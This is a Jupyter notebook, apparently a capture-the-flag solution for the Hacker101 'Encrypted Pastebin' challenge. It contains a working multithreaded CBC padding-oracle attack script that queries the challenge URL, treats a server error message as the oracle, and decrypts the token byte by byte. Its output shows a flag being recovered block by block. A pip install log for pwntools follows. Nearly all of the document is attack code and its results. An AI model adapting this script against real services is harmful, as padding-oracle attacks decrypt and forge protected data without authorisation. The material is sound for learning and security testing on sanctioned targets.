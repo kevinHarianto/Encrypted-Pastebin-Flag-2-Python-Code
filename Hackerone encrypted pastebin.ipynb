{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f4f034d",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  0%|          | 0/9 [00:00<?, ?it/s]\n",
      "  0%|          | 0/16 [00:00<?, ?it/s]\u001b[A\n",
      "  6%|▋         | 1/16 [00:04<01:03,  4.24s/it]\u001b[A\n",
      " 12%|█▎        | 2/16 [00:07<00:53,  3.85s/it]\u001b[A\n",
      " 19%|█▉        | 3/16 [00:11<00:50,  3.88s/it]\u001b[A\n",
      " 25%|██▌       | 4/16 [00:15<00:47,  3.94s/it]\u001b[A\n",
      " 31%|███▏      | 5/16 [00:19<00:42,  3.86s/it]\u001b[A\n",
      " 38%|███▊      | 6/16 [00:33<01:11,  7.18s/it]\u001b[A\n",
      " 44%|████▍     | 7/16 [00:36<00:54,  6.05s/it]\u001b[A\n",
      " 50%|█████     | 8/16 [00:40<00:43,  5.45s/it]\u001b[A\n",
      " 56%|█████▋    | 9/16 [00:44<00:34,  4.96s/it]\u001b[A\n",
      " 62%|██████▎   | 10/16 [00:48<00:27,  4.64s/it]\u001b[A\n",
      " 69%|██████▉   | 11/16 [00:53<00:22,  4.52s/it]\u001b[A\n",
      " 75%|███████▌  | 12/16 [01:02<00:23,  5.95s/it]\u001b[A\n",
      " 81%|████████▏ | 13/16 [01:10<00:20,  6.76s/it]\u001b[A\n",
      " 88%|████████▊ | 14/16 [01:14<00:11,  5.87s/it]\u001b[A\n",
      " 94%|█████████▍| 15/16 [01:18<00:05,  5.28s/it]\u001b[A\n",
      "100%|██████████| 16/16 [01:22<00:00,  5.16s/it]\u001b[A\n",
      " 11%|█         | 1/9 [01:22<10:59, 82.49s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'{\"flag\": \"^FLAG^'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "  0%|          | 0/16 [00:00<?, ?it/s]\u001b[A\n",
      "  6%|▋         | 1/16 [00:03<00:54,  3.62s/it]\u001b[A\n",
      " 12%|█▎        | 2/16 [00:07<00:54,  3.92s/it]\u001b[A\n",
      " 19%|█▉        | 3/16 [00:16<01:21,  6.26s/it]\u001b[A\n",
      " 25%|██▌       | 4/16 [00:25<01:25,  7.12s/it]\u001b[A\n",
      " 31%|███▏      | 5/16 [00:29<01:06,  6.08s/it]\u001b[A\n",
      " 38%|███▊      | 6/16 [00:33<00:53,  5.36s/it]\u001b[A\n",
      " 44%|████▍     | 7/16 [00:37<00:43,  4.79s/it]\u001b[A\n",
      " 50%|█████     | 8/16 [00:40<00:35,  4.48s/it]\u001b[A\n",
      " 56%|█████▋    | 9/16 [00:44<00:29,  4.28s/it]\u001b[A\n",
      " 62%|██████▎   | 10/16 [00:48<00:24,  4.06s/it]\u001b[A\n",
      " 69%|██████▉   | 11/16 [01:01<00:34,  6.91s/it]\u001b[A\n",
      " 75%|███████▌  | 12/16 [01:06<00:24,  6.18s/it]\u001b[A\n",
      " 81%|████████▏ | 13/16 [01:10<00:16,  5.64s/it]\u001b[A\n",
      " 88%|████████▊ | 14/16 [01:14<00:10,  5.19s/it]\u001b[A\n",
      " 94%|█████████▍| 15/16 [01:18<00:04,  4.86s/it]\u001b[A\n",
      "100%|██████████| 16/16 [01:22<00:00,  5.18s/it]\u001b[A\n",
      " 22%|██▏       | 2/9 [02:45<09:38, 82.68s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'{\"flag\": \"^FLAG^04efdad8b746af25'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "  0%|          | 0/16 [00:00<?, ?it/s]\u001b[A\n",
      "  6%|▋         | 1/16 [00:13<03:19, 13.32s/it]\u001b[A\n",
      " 12%|█▎        | 2/16 [00:17<01:47,  7.66s/it]\u001b[A\n",
      " 19%|█▉        | 3/16 [00:21<01:18,  6.02s/it]\u001b[A\n",
      " 25%|██▌       | 4/16 [00:24<01:00,  5.07s/it]\u001b[A\n",
      " 31%|███▏      | 5/16 [00:28<00:49,  4.54s/it]\u001b[A\n",
      " 38%|███▊      | 6/16 [00:32<00:44,  4.41s/it]\u001b[A\n",
      " 44%|████▍     | 7/16 [00:36<00:37,  4.15s/it]\u001b[A\n",
      " 50%|█████     | 8/16 [00:39<00:31,  3.96s/it]\u001b[A\n",
      " 56%|█████▋    | 9/16 [00:52<00:47,  6.79s/it]\u001b[A\n",
      " 62%|██████▎   | 10/16 [00:56<00:35,  5.87s/it]\u001b[A\n",
      " 69%|██████▉   | 11/16 [01:00<00:26,  5.29s/it]\u001b[A\n",
      " 75%|███████▌  | 12/16 [01:04<00:19,  4.81s/it]\u001b[A\n",
      " 81%|████████▏ | 13/16 [01:12<00:17,  5.96s/it]\u001b[A\n",
      " 88%|████████▊ | 14/16 [01:16<00:10,  5.35s/it]\u001b[A\n",
      " 94%|█████████▍| 15/16 [01:20<00:04,  4.84s/it]\u001b[A\n",
      "100%|██████████| 16/16 [01:29<00:00,  5.57s/it]\u001b[A\n",
      " 33%|███▎      | 3/9 [04:14<08:33, 85.64s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'{\"flag\": \"^FLAG^04efdad8b746af25613487503abca577'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "  0%|          | 0/16 [00:00<?, ?it/s]\u001b[A\n",
      "  6%|▋         | 1/16 [00:03<00:56,  3.77s/it]\u001b[A\n",
      " 12%|█▎        | 2/16 [00:07<00:51,  3.68s/it]\u001b[A\n",
      " 19%|█▉        | 3/16 [00:11<00:49,  3.78s/it]\u001b[A\n",
      " 25%|██▌       | 4/16 [00:20<01:09,  5.78s/it]\u001b[A\n",
      " 31%|███▏      | 5/16 [00:24<00:56,  5.11s/it]\u001b[A\n",
      " 38%|███▊      | 6/16 [00:27<00:47,  4.71s/it]\u001b[A\n",
      " 44%|████▍     | 7/16 [00:36<00:54,  6.10s/it]\u001b[A\n",
      " 50%|█████     | 8/16 [00:41<00:44,  5.54s/it]\u001b[A\n",
      " 56%|█████▋    | 9/16 [00:45<00:35,  5.00s/it]\u001b[A\n",
      " 62%|██████▎   | 10/16 [00:48<00:27,  4.60s/it]\u001b[A\n",
      " 69%|██████▉   | 11/16 [00:57<00:29,  5.90s/it]\u001b[A\n",
      " 75%|███████▌  | 12/16 [01:01<00:21,  5.29s/it]\u001b[A\n",
      " 81%|████████▏ | 13/16 [01:05<00:14,  4.83s/it]\u001b[A\n",
      " 88%|████████▊ | 14/16 [01:14<00:12,  6.12s/it]\u001b[A\n",
      " 94%|█████████▍| 15/16 [01:18<00:05,  5.37s/it]\u001b[A\n",
      "100%|██████████| 16/16 [01:21<00:00,  5.12s/it]\u001b[A\n",
      " 44%|████▍     | 4/9 [05:36<07:00, 84.17s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'{\"flag\": \"^FLAG^04efdad8b746af25613487503abca5771777c39e24ba2025'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "  0%|          | 0/16 [00:00<?, ?it/s]\u001b[A\n",
      "  6%|▋         | 1/16 [00:04<01:00,  4.00s/it]\u001b[A\n",
      " 12%|█▎        | 2/16 [00:13<01:38,  7.00s/it]\u001b[A\n",
      " 19%|█▉        | 3/16 [00:17<01:13,  5.64s/it]\u001b[A\n",
      " 25%|██▌       | 4/16 [00:21<00:59,  4.97s/it]\u001b[A\n",
      " 31%|███▏      | 5/16 [00:29<01:09,  6.32s/it]\u001b[A\n",
      " 38%|███▊      | 6/16 [00:34<00:56,  5.65s/it]\u001b[A\n",
      " 44%|████▍     | 7/16 [00:37<00:45,  5.06s/it]\u001b[A\n",
      " 50%|█████     | 8/16 [00:41<00:37,  4.72s/it]\u001b[A\n",
      " 56%|█████▋    | 9/16 [00:50<00:42,  6.06s/it]\u001b[A\n",
      " 62%|██████▎   | 10/16 [00:54<00:32,  5.38s/it]\u001b[A\n",
      " 69%|██████▉   | 11/16 [00:58<00:24,  4.91s/it]\u001b[A\n",
      " 75%|███████▌  | 12/16 [01:07<00:24,  6.12s/it]\u001b[A\n",
      " 81%|████████▏ | 13/16 [01:11<00:16,  5.40s/it]\u001b[A\n",
      " 88%|████████▊ | 14/16 [01:15<00:10,  5.07s/it]\u001b[A\n",
      " 94%|█████████▍| 15/16 [01:24<00:06,  6.35s/it]\u001b[A\n",
      "100%|██████████| 16/16 [01:30<00:00,  5.65s/it]\u001b[A\n",
      " 56%|█████▌    | 5/9 [07:06<05:45, 86.40s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'{\"flag\": \"^FLAG^04efdad8b746af25613487503abca5771777c39e24ba2025fe3d6889d78a0c18'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "  0%|          | 0/16 [00:00<?, ?it/s]\u001b[A\n",
      "  6%|▋         | 1/16 [00:04<01:13,  4.89s/it]\u001b[A\n",
      " 12%|█▎        | 2/16 [00:14<01:48,  7.75s/it]\u001b[A\n",
      " 19%|█▉        | 3/16 [00:19<01:20,  6.20s/it]\u001b[A\n",
      " 25%|██▌       | 4/16 [00:23<01:05,  5.47s/it]\u001b[A\n",
      " 31%|███▏      | 5/16 [00:33<01:19,  7.20s/it]\u001b[A\n",
      " 38%|███▊      | 6/16 [00:39<01:06,  6.61s/it]\u001b[A\n",
      " 44%|████▍     | 7/16 [00:49<01:09,  7.72s/it]\u001b[A\n",
      " 50%|█████     | 8/16 [00:54<00:57,  7.13s/it]\u001b[A\n",
      " 56%|█████▋    | 9/16 [01:00<00:46,  6.70s/it]\u001b[A\n",
      " 62%|██████▎   | 10/16 [01:10<00:45,  7.62s/it]\u001b[A\n",
      " 69%|██████▉   | 11/16 [01:15<00:33,  6.74s/it]\u001b[A\n",
      " 75%|███████▌  | 12/16 [01:24<00:30,  7.59s/it]\u001b[A\n",
      " 81%|████████▏ | 13/16 [01:29<00:20,  6.80s/it]\u001b[A\n",
      " 88%|████████▊ | 14/16 [01:34<00:12,  6.06s/it]\u001b[A\n",
      " 94%|█████████▍| 15/16 [01:38<00:05,  5.68s/it]\u001b[A\n",
      "100%|██████████| 16/16 [01:49<00:00,  6.81s/it]\u001b[A\n",
      " 67%|██████▋   | 6/9 [08:55<04:42, 94.09s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'{\"flag\": \"^FLAG^04efdad8b746af25613487503abca5771777c39e24ba2025fe3d6889d78a0c18$FLAG$\", \"id\": \"'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "  0%|          | 0/16 [00:00<?, ?it/s]\u001b[A\n",
      "  6%|▋         | 1/16 [00:05<01:21,  5.41s/it]\u001b[A\n",
      " 12%|█▎        | 2/16 [00:15<01:51,  7.99s/it]\u001b[A\n",
      " 19%|█▉        | 3/16 [00:19<01:22,  6.33s/it]\u001b[A\n",
      " 25%|██▌       | 4/16 [00:24<01:09,  5.78s/it]\u001b[A\n",
      " 31%|███▏      | 5/16 [00:28<00:55,  5.03s/it]\u001b[A\n",
      " 38%|███▊      | 6/16 [00:36<01:02,  6.23s/it]\u001b[A\n",
      " 44%|████▍     | 7/16 [00:40<00:48,  5.41s/it]\u001b[A\n",
      " 50%|█████     | 8/16 [00:44<00:40,  5.02s/it]\u001b[A\n",
      " 56%|█████▋    | 9/16 [00:52<00:42,  6.01s/it]\u001b[A\n",
      " 62%|██████▎   | 10/16 [00:56<00:32,  5.42s/it]\u001b[A\n",
      " 69%|██████▉   | 11/16 [01:00<00:24,  4.87s/it]\u001b[A"
     ]
    }
   ],
   "source": [
    "from base64 import *\n",
    "from pwn import *\n",
    "from tqdm import trange\n",
    "import requests as req\n",
    "import threading\n",
    "\n",
    "url='https://4400cf3750bfea618ab105ec1ceb6d9d.ctf.hacker101.com/?post='\n",
    "\n",
    "def custom_decode(x):\n",
    "    x=x.replace(b'~', b'=').replace(b'!', b'/').replace(b'-', b'+')\n",
    "    return b64decode(x)\n",
    "\n",
    "def custom_encode(x):\n",
    "    x=b64encode(x)\n",
    "    return x.replace(b'=', b'~').replace(b'/', b'!').replace(b'+', b'-')\n",
    "\n",
    "def oracle(x):\n",
    "    web=req.get(url+custom_encode(x).decode())\n",
    "    return 'File \"./common.py\"' not in  web.text\n",
    "\n",
    "cur_param=b'3HNVHJ-fDKS3ifHtG!9bNxzYkPdaAe!Pz0vNQJh6-LxoCM4VBjhg0H9d1IO3HhU0po3sTiPHFdYqCUq6m0tWc0Sb88!rN8f1UlZWCYCCh4uEV9hYuJ87!-yBwKMnoXZRrAWMey1qNZ8NRiLiZOXUWeN45RBqmVyQLI!kiH5GmUNtwL8lyPCYL-!!mlt8-EOC0cHY4ApS77XWh5XSpMaYJA~~'\n",
    "\n",
    "cur_param=custom_decode(cur_param)\n",
    "\n",
    "ans=b''\n",
    "cur=b''\n",
    "\n",
    "def find_byte_range(iv, mess, cur, now, start, end, result):\n",
    "    for k in range(start, end):\n",
    "        if oracle(iv[:now] + bytes([k]) + xor(cur, iv[now+1:], chr(16-now).encode()*(15-now)) + mess):\n",
    "            result.append(k)\n",
    "            break\n",
    "\n",
    "for i in trange(0, len(cur_param)-16, 16):\n",
    "    iv, mess = cur_param[i:i+16], cur_param[i+16:i+32]\n",
    "    for j in trange(16):\n",
    "        now = 15 - j\n",
    "        threads = []\n",
    "        result = []\n",
    "        step = 256 // 32\n",
    "        for t in range(32):\n",
    "            start = t * step\n",
    "            end = (t + 1) * step if t != 31 else 256\n",
    "            thread = threading.Thread(target=find_byte_range, args=(iv, mess, cur, now, start, end, result))\n",
    "            threads.append(thread)\n",
    "            thread.start()\n",
    "\n",
    "        for thread in threads:\n",
    "            thread.join()\n",
    "        \n",
    "        if result:\n",
    "            k = result[0]\n",
    "            if now == 15:\n",
    "                if k != iv[15]:\n",
    "                    cur = xor(k, iv[15], 1) + cur\n",
    "            else:\n",
    "                cur = xor(k, iv[now], (16-now)) + cur\n",
    "#            print(cur)\n",
    "\n",
    "    ans += cur\n",
    "    print(ans)\n",
    "    cur = b''\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "aa8a11da",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pwn\n",
      "  Downloading pwn-1.0.tar.gz (1.1 kB)\n",
      "  Preparing metadata (setup.py): started\n",
      "  Preparing metadata (setup.py): finished with status 'done'\n",
      "Collecting pwntools\n",
      "  Downloading pwntools-4.13.1-py2.py3-none-any.whl (11.9 MB)\n",
      "     ---------------------------------------- 11.9/11.9 MB 8.5 MB/s eta 0:00:00\n",
      "Collecting mako>=1.0.0\n",
      "  Downloading Mako-1.3.8-py3-none-any.whl (78 kB)\n",
      "     ---------------------------------------- 78.6/78.6 kB ? eta 0:00:00\n",
      "Requirement already satisfied: python-dateutil in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (2.8.2)\n",
      "Collecting pyserial>=2.7\n",
      "  Downloading pyserial-3.5-py2.py3-none-any.whl (90 kB)\n",
      "     ---------------------------------------- 90.6/90.6 kB 5.4 MB/s eta 0:00:00\n",
      "Requirement already satisfied: psutil>=3.3.0 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (5.9.0)\n",
      "Requirement already satisfied: pysocks in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (1.7.1)\n",
      "Requirement already satisfied: sortedcontainers in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (2.4.0)\n",
      "Collecting ropgadget>=5.3\n",
      "  Downloading ROPGadget-7.5-py3-none-any.whl (32 kB)\n",
      "Requirement already satisfied: requests>=2.0 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (2.28.1)\n",
      "Collecting capstone>=3.0.5rc2\n",
      "  Downloading capstone-6.0.0a2-cp39-cp39-win_amd64.whl (2.0 MB)\n",
      "     ---------------------------------------- 2.0/2.0 MB 9.1 MB/s eta 0:00:00\n",
      "Collecting unicorn>=2.0.1\n",
      "  Downloading unicorn-2.1.1-py2.py3-none-win_amd64.whl (15.8 MB)\n",
      "     ---------------------------------------- 15.8/15.8 MB 8.8 MB/s eta 0:00:00\n",
      "Collecting unix-ar\n",
      "  Downloading unix_ar-0.2.1-py2.py3-none-any.whl (6.5 kB)\n",
      "Requirement already satisfied: pygments>=2.0 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (2.18.0)\n",
      "Requirement already satisfied: packaging in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (21.3)\n",
      "Collecting zstandard\n",
      "  Downloading zstandard-0.23.0-cp39-cp39-win_amd64.whl (495 kB)\n",
      "     -------------------------------------- 495.5/495.5 kB 7.8 MB/s eta 0:00:00\n",
      "Collecting colored-traceback\n",
      "  Downloading colored_traceback-0.4.2-py3-none-any.whl (5.5 kB)\n",
      "Collecting pyelftools>=0.29\n",
      "  Downloading pyelftools-0.31-py3-none-any.whl (180 kB)\n",
      "     -------------------------------------- 180.5/180.5 kB 5.5 MB/s eta 0:00:00\n",
      "Requirement already satisfied: pip>=6.0.8 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (22.2.2)\n",
      "Requirement already satisfied: intervaltree>=3.0 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (3.1.0)\n",
      "Requirement already satisfied: paramiko>=1.15.2 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (2.8.1)\n",
      "Requirement already satisfied: six>=1.12.0 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from pwntools->pwn) (1.16.0)\n",
      "Collecting rpyc\n",
      "  Downloading rpyc-6.0.1-py3-none-any.whl (74 kB)\n",
      "     ---------------------------------------- 74.6/74.6 kB ? eta 0:00:00\n",
      "Requirement already satisfied: MarkupSafe>=0.9.2 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from mako>=1.0.0->pwntools->pwn) (2.0.1)\n",
      "Requirement already satisfied: pynacl>=1.0.1 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from paramiko>=1.15.2->pwntools->pwn) (1.5.0)\n",
      "Requirement already satisfied: bcrypt>=3.1.3 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from paramiko>=1.15.2->pwntools->pwn) (3.2.0)\n",
      "Requirement already satisfied: cryptography>=2.5 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from paramiko>=1.15.2->pwntools->pwn) (37.0.1)\n",
      "Requirement already satisfied: charset-normalizer<3,>=2 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from requests>=2.0->pwntools->pwn) (2.0.4)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from requests>=2.0->pwntools->pwn) (2022.9.14)\n",
      "Requirement already satisfied: urllib3<1.27,>=1.21.1 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from requests>=2.0->pwntools->pwn) (1.26.11)\n",
      "Requirement already satisfied: idna<4,>=2.5 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from requests>=2.0->pwntools->pwn) (3.3)\n",
      "Requirement already satisfied: colorama in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from colored-traceback->pwntools->pwn) (0.4.6)\n",
      "Requirement already satisfied: pyparsing!=3.0.5,>=2.0.2 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from packaging->pwntools->pwn) (3.0.9)\n",
      "Collecting plumbum\n",
      "  Downloading plumbum-1.9.0-py3-none-any.whl (127 kB)\n",
      "     -------------------------------------- 128.0/128.0 kB 7.4 MB/s eta 0:00:00\n",
      "Requirement already satisfied: cffi>=1.1 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from bcrypt>=3.1.3->paramiko>=1.15.2->pwntools->pwn) (1.15.1)\n",
      "Requirement already satisfied: pywin32 in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from plumbum->rpyc->pwntools->pwn) (302)\n",
      "Requirement already satisfied: pycparser in c:\\users\\kevin\\anaconda3\\lib\\site-packages (from cffi>=1.1->bcrypt>=3.1.3->paramiko>=1.15.2->pwntools->pwn) (2.21)\n",
      "Building wheels for collected packages: pwn\n",
      "  Building wheel for pwn (setup.py): started\n",
      "  Building wheel for pwn (setup.py): finished with status 'done'\n",
      "  Created wheel for pwn: filename=pwn-1.0-py3-none-any.whl size=1202 sha256=355900cc68fd0bef3407d8c3887f1f2183cc944a338da36a9a8bff4c7b75ecd4\n",
      "  Stored in directory: c:\\users\\kevin\\appdata\\local\\pip\\cache\\wheels\\34\\a6\\82\\682ac94b58ae2e949908f11392d778574372a6cedc78b4b0a5\n",
      "Successfully built pwn\n",
      "Installing collected packages: unicorn, pyserial, pyelftools, zstandard, unix-ar, plumbum, mako, colored-traceback, capstone, rpyc, ropgadget, pwntools, pwn\n",
      "Successfully installed capstone-6.0.0a2 colored-traceback-0.4.2 mako-1.3.8 plumbum-1.9.0 pwn-1.0 pwntools-4.13.1 pyelftools-0.31 pyserial-3.5 ropgadget-7.5 rpyc-6.0.1 unicorn-2.1.1 unix-ar-0.2.1 zstandard-0.23.0\n"
     ]
    }
   ],
   "source": [
    "!pip install pwn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "12a30e9e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
